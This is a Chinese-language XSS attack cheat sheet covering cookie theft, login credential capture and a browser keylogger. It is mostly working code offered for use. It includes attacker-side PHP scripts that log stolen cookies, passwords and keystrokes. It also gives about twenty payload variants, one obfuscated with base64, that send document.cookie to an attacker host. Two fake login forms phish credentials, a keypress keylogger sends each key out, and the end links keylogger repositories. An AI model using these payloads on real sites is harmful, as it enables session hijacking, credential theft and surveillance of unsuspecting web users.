# XSS漏洞

## 1.窃取cookie

攻击者主机colector.php
```php
<?php
  $cookie = $_GET['cookie'];
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $file = fopen('colector.txt', 'a');
  fwrite($file,"USER AGENT:$useragent\r\nCOOKIE=$cookie\r\n");
  fclose($file);
?>
```

赋予权限
```bash
chmod 755 colector.php
```

payload：
```javascript
<script>document.location='http://攻击者主机地址/colector.php?cookie='+document.cookie</script>
```

其它触发方式：
```javascript
<img src=x onerror=this.src="http://攻击者主机地址/?c="+document.cookie>
<img src=x onerror="location.href='http://攻击者主机地址/?c='+ document.cookie">
<script>new Image().src="http://攻击者主机地址/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://攻击者主机地址/?c="+escape(document.cookie);</script>
<script>location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://攻击者主机地址?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://攻击者主机地址?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://攻击者主机地址/?c="+document.cookie</script>
<script>window.location="https://攻击者主机地址/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://攻击者主机地址/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovL+aUu+WHu+iAheS4u+acuuWcsOWdgD9jPSIrIGRvY3VtZW50LmNvb2tpZSArIicgLz4iKQ=='));</script>
<script>fetch('https://子域名.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://攻击者主机地址/',document.cookie)</script>
```

## 2.捕获登录凭据

(1)捕获注入页面登录凭据

确认登录表单参数值用户名为username，密码为password。

payload
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://攻击者主机',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

(2)凭据钓鱼窗口

payload
```javascript
<style>::placeholder { color:white; }</style>
<script>
document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'> \
<form action='http://攻击者主机/' method='post'> \
<p>你的session已经过期，请重新登录:</p> \
<input style='width:100%;' type='text' name='username' placeholder='Username' /> \
<input style='width: 100%' type='password' name='password' placeholder='Password'/> \
<input type='submit' value='Login'> \
</form> \
<p><i>该登录表单仅为演示作用</i></p> \
</div>")
</script>
```

(3)用户界面修改

payload
```javascript
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form action='http://攻击者主机/capture.php ' method='post'><input style='width:100%;' type='text' name='username' placeholder='Username' />\
<input style='width: 100%' type='password' name='password' placeholder='Password'/><input value='submit' type='submit'></form>"
</script>
```

攻击者主机capture.php:
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        file_put_contents('credentials.txt', "Username: $username, Password: $password\n", FILE_APPEND);
		//凭据保存至credentials.txt文件中，需要手动创建该文件并赋予权限
    }
}
?>
```

## 3.键盘记录器

攻击者主机key.php
```php
<?php
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $log = $_GET["keylog"];
  $file = fopen('captured.txt', 'a');
  //保存到captured.txt文件中
  fwrite($file,"User-Agent:$useragent\r\nKeyLog:$log\r\n");
  fclose($file);
?>
```

payload
```javascript
<img src=x onerror='document.onkeypress=function(e){
    var key = encodeURIComponent(String.fromCharCode(e.which));
    fetch("http://攻击者主机/key.php?keylog=" + key);
},this.remove();'>
```

GitHub tools:

[Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)

[keylogger](https://github.com/rajeshmajumdar/keylogger)

[JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
